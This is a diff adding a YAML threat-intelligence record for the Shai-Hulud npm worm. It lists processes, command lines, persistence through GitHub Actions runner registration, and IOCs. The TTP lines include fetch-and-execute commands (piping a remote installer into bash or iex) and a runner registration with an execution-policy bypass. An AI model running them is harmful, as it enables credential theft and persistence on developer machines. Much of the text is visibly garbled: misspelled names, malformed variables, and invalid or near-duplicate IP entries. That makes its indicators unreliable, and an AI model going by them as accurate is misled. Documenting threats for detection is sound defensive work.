@@ -1,0 +1,66 @@
+description: Shai-Hulud is a self-replicating npm worm that steals developer credentials
+  and publishes them to public repositories, using the Bun runtime to evade detection.
+malware_families:
+- Shai-Hulud
+TTPs:
+  processes:
+  - powershell.exe
+  - curl
+  - bash
+  - trufflehog.exe
+  commandline:
+  - powershell -c irm bun.sh/install.psl|iex"";
+  - curl -sSL https://bun.sh/install | bash
+  - ./config.sh --url https://github.com/${0x349291}/${0x2bla39} --unattended -token ${_0x148%ecc} --name "SRAIRULUD"
+  - powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri actions-runner-win-x64-2.330.0.zip"
+  - powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory (\"actions-runner-win-x64-2.330.0.zip\, \".\") "
+  - ./config.cmd --url https://github.com/${ 0x349291}/${ 0x2bla39} --unattended -tokem ${_ 0x148%ecc} --name "SEAIHULUD"
+  powershell:
+  - Invoke-WebRequest -Uri actions-runner-win-x64-2.330.0.zip
+  - Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory
+    (\"actions-runner-win-x64-2.330.0.zip\, \".\")
+  scripting_engine:
+  - JavaScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - curl.exe
+  - https://github.com/actions/runner/releases/download/v2.330.0
+  - https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest
+  file_activity:
+  - Setup_bun.js
+  - Bun_environment.js
+  - /actions-runner-linux-x64-2.330.0.tar.gz
+  - ./config.sh
+  - actions-runner-win-x64-2.330.0.zip
+  - ./config.cmd
+  - trufflehog.exe
+  persistence:
+  - GitHub Actions self-hosted runner registration
+  process_relations: []
+IOCs:
+  hashes:
+  - 'MD5 : 4d6b9efc22ec229be58b90c7991c02dd'
+  - MD5 :207b3c83c0460d5ed9091036af2b357a
+  ip_addresses:
+  - 185.198.110.133
+  - 165.196.110.133
+  - 165.198.110.133
+  - 185.199.110.133
+  - 125.196.110.133
+  - 185-199-110-033
+  - 185-130-110-133
+  - 185-199-110-133
+  - 25-190-T10-133
+  - 195-199-110-133
+  - 185-136-110-132
+  domains:
+  - github.com
+  urls:
+  - https://github.com/actions/runner/releases/download/v2.330.0
+  - https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest
+authors:
+- Sakshi Raut
+reference: https://www.pointwild.com/threat-intelligence/shai-hulud-2-0-the-second-coming
+date_of_publication: January 13, 2026
+file_creation_date: February 28, 2026
